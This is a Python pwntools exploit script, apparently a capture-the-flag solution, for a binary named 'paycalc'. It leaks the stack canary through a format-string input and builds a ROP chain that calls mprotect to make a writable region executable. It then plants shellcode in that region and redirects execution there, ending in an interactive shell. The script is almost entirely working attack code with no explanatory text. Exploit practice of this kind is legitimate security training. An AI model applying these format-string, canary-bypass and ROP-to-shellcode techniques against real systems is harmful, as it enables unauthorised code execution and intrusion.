#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('paycalc')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *log_error+680
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def send_msg(name, hrs, reason):
    io.sendafter(b":", name)
    io.sendlineafter(b":", str(hrs).encode())
    io.sendlineafter(b":", reason)
    io.sendafter(b":", b"N")


def solve():

    send_msg(b"canary", 50, b"%37$p")
    io.recvuntil(b"REASON:\n")
    leak = io.recvline().strip(b"\n")
    canary = int(leak, 16)
    info("canary: %#x", canary)

    offset = 104
    pop_rdi = 0x448627 # pop rdi; ret;
    pop_rsi = 0x401ea7 # pop rsi; ret;
    pop_rdx = 0x43e345 # pop rdx; ret;
    pop_rax = 0x4721d8 # pop rax; ret;
    syscall = 0x462275 # syscall; ret;

    addr = exe.sym["NOTES"] &~ 0xfff
    length = 0x1000
    prot = 0x7

    payload = flat(
        [
            pop_rdi,
            addr,
            pop_rsi,
            length,
            pop_rdx,
            prot,
            pop_rax,
            0xa,
            syscall,
            exe.sym["main"]
        ]
    )

    payload = payload.ljust(offset, b".")

    payload += flat(
        [
            canary,
            b"A"*24,
            pop_rax + 1
        ]
    )

    send_msg(payload, 4294967280, b"mprotect")
    io.sendlineafter(b":", b"1")
    io.sendafter(b":", b"N")

    sc =  asm("nop") * 30
    sc += asm(shellcraft.sh())

    send_msg(b"sc", 50, sc)

    offset = 104
    payload = flat({
        offset: [
            canary,
            b"A"*24,
            exe.sym["NOTES"]
        ]
    })

    send_msg(payload, 4294967280, b"pwned!")

    io.clean()

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

